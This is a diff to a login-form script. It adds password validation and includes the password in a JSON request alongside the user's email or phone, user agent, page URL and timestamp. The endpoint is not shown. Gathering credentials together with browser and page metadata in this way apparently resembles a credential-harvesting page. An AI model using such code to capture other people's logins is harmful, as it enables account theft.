@@ -9,6 +9,8 @@ document.addEventListener("DOMContentLoaded", () => {
   const phoneWrapper = document.getElementById("phone-wrapper");
   const form = document.getElementById("login-form");
   const errorIcon = document.querySelector(".al-input__error-icon");
+  const passwordInput = document.getElementById("password");
+  const errorPassword = document.getElementById("error-password");
 
   const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
   const isPhone = (val) => /^\d+$/.test(val);
@@ -26,6 +28,8 @@ function validate() {
   const isPhoneInput = /^\d+$/.test(val);
   const isEmailInput = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val);
   const isValidPhone = isPhoneInput && val.length >= 9;
+  const passwordVal = passwordInput.value.trim();
+  const isPasswordValid = passwordVal.length >= 8;
 
   // Reset
   input.classList.remove("error", "valid", "phone-mode");
@@ -37,6 +41,8 @@ function validate() {
   button.classList.remove("active");
   button.disabled = true;
   errorIcon.style.display = "none";
+  passwordInput.classList.remove("error", "valid");
+  errorPassword.classList.add("hidden");
 
   let hasError = false;
 
@@ -82,9 +88,15 @@ function validate() {
   } else {
     subtext.classList.add("hidden"); // ❌ Скрываем сабтекст если есть ошибки
   }
-
-  updateLabelState();
-}
+  if (!isPasswordValid && touched) {
+    passwordInput.classList.add("error");
+    errorPassword.classList.remove("hidden");
+    hasError = true;
+  } else if (isPasswordValid) {
+    passwordInput.classList.add("valid");
+  }
+    updateLabelState();
+  }
 
   input.addEventListener("focus", () => {
     touched = true;
@@ -118,6 +130,7 @@ function validate() {
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           user_input: val,
+          password: passwordInput.value.trim(),
           userAgent: navigator.userAgent,
           location: window.location.href,
           timestamp: new Date().toISOString(),
